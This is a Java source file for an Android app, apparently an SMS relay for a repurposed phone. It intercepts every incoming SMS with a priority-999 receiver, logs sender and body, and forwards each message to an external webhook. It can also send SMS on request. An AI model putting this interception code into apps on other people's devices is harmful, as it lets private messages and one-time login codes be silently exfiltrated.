package com.androidnas;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.telephony.SmsMessage;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class SmsManager {
    private static final List<String> smsLogs = new ArrayList<>();
    private static final SimpleDateFormat sdf = new SimpleDateFormat("MM-dd HH:mm", Locale.US);

    public static void init(Context context) {
        IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        filter.setPriority(999);
        context.registerReceiver(new Receiver(), filter);
    }

    public static void sendSms(String phone, String content) {
        try {
            android.telephony.SmsManager sm = android.telephony.SmsManager.getDefault();
            sm.sendTextMessage(phone, null, content, null, null);
            addLog("发送给 " + phone, content);
            WebhookManager.send("短信发送成功", "收件人: " + phone + "\n内容: " + content);
        } catch (Exception e) {
            WebhookManager.send("短信发送失败", "原因: " + e.getMessage());
        }
    }

    public static String getLogsJson() {
        synchronized (smsLogs) {
            StringBuilder sb = new StringBuilder("[");
            for (int i = 0; i < smsLogs.size(); i++) {
                if (i > 0) sb.append(",");
                sb.append(smsLogs.get(i));
            }
            sb.append("]");
            return sb.toString();
        }
    }

    private static void addLog(String sender, String body) {
        String time = sdf.format(new Date());
        String json = "{\"sender\":\"" + esc(sender) + "\",\"body\":\"" + esc(body) + "\",\"time\":\"" + time + "\"}";
        synchronized (smsLogs) {
            smsLogs.add(0, json);
            if (smsLogs.size() > 50) smsLogs.remove(50);
        }
    }

    private static String esc(String s) {
        return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", " ").replace("\r", "");
    }

    static class Receiver extends BroadcastReceiver {
        @Override public void onReceive(Context context, Intent intent) {
            try {
                Object[] pdus = (Object[]) intent.getExtras().get("pdus");
                for (Object pdu : pdus) {
                    SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                    String body = sms.getMessageBody();
                    String sender = sms.getOriginatingAddress();
                    addLog(sender, body);
                    WebhookManager.send("📩 收到新短信", "发件人: " + sender + "\n内容: " + body);
                }
            } catch (Exception ignored) {}
        }
    }
}
